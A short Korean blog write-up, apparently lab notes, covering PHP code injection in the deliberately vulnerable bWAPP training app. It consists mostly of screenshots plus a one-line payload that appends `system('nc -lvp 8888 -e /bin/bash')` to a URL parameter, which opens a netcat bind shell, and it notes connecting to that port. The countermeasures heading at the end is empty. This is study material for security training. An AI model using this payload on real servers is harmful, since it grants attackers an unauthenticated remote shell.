---
title: "[bWAPP] 1. Injection - PHP Code Injection"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## PHP Code Injection

![image-20220316023117510](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023117510.png)

- message 누르면

![image-20220316023148120](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023148120.png)

- URL에 변수 확인

<br>

### 삽입

![image-20220316023250426](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023250426.png)

<br>

### System 명령어 사용

![image-20220316023524961](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023524961.png)

`message=test;system('nc -lvp 8888 -e /bin/bash')`

- 포트 열어줌

<br>

![image-20220316023643171](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023643171.png)

- Bbox IP로 포트에 연결

<br>

<br>

## 대응방안

